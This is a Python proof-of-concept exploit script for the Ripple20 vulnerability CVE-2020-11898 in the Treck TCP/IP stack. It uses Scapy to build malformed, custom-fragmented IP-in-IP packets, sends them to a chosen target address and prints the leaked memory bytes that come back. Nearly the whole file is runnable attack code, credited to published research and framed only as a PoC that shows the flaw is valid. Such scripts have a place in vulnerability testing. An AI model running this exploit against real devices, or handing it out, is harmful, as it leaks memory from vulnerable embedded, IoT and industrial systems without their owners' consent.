from scapy.all import IP, conf, raw, send
import argparse
import socket

"""
Any useful python code in here was 'borrowed' from the great blog article
over at: 

https://blog.nviso.eu/2020/07/16/testing-ripple20-a-closer-look-and-proof-of-concept-script-for-cve-2020-11898/

which is based on the research at:

https://www.jsof-tech.com/disclosures/ripple20/

This script is just a simple PoC to show the vuln is valid
"""

def fragmentCustom(self):
    """
    Modified version of Scapy's "fragment" function 
    to create custom-size fragments instead of fixed-size
    ones.
 
    We create one with payload length of 24, as in whitepaper,
    then the rest (136) bytes of payload go in the second one.
    """
    lst = []
    fnb = 0
    fl = self
    while fl.underlayer is not None:
        fnb += 1
        fl = fl.underlayer
 
    for p in fl:
 
        s = raw(p[fnb].payload)
 
        # first fragment
        q = p.copy()
        del(q[fnb].payload)
        del(q[fnb].chksum)
        del(q[fnb].len)
        q[fnb].flags |= 1 # set fragmentation to true
        q[fnb].frag += 0
        r = conf.raw_layer(load=s[0:24]) # copy first 24 bytes
        r.overload_fields = p[fnb].payload.overload_fields.copy()
        q.add_payload(r)
        lst.append(q)
 
        # second fragment
        q = p.copy()
        del(q[fnb].payload)
        del(q[fnb].chksum)
        del(q[fnb].len)
        q[fnb].frag += 3
        r = conf.raw_layer(load=s[24:]) # copy the rest
        r.overload_fields = p[fnb].payload.overload_fields.copy()
        q.add_payload(r)
        lst.append(q)
 
    return lst


if __name__ == "__main__":

    opts = argparse.ArgumentParser()

    opts.add_argument('-t', '--target', help="IP Address of target", required=True)
    opts.add_argument('-c', '--count', help='Number of fragmented pings to send', type=int, default=10)
    opts.add_argument('-o', '--offset', help='Number of bytes to offset to remove normal ICMP data from response', type=int, default=72)
    args = opts.parse_args()

    innerPayload = "\x00"*40 + "\x41"*100 # as described in JSOF's whitepaper 
    innerPacket = IP(ihl=0xf, len=100, proto=0, dst=args.target)
    innerPacket.add_payload(innerPayload.encode("ascii"))

    outerPacket = IP(dst=args.target,id=0xabcd)/innerPacket
    frags = fragmentCustom(outerPacket)
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)

    for c in range(args.count):
        
        for f in frags:
            send(f)
        recv, addr = s.recvfrom(1508)
        print("Response received!")
        print(recv[args.offset:])

        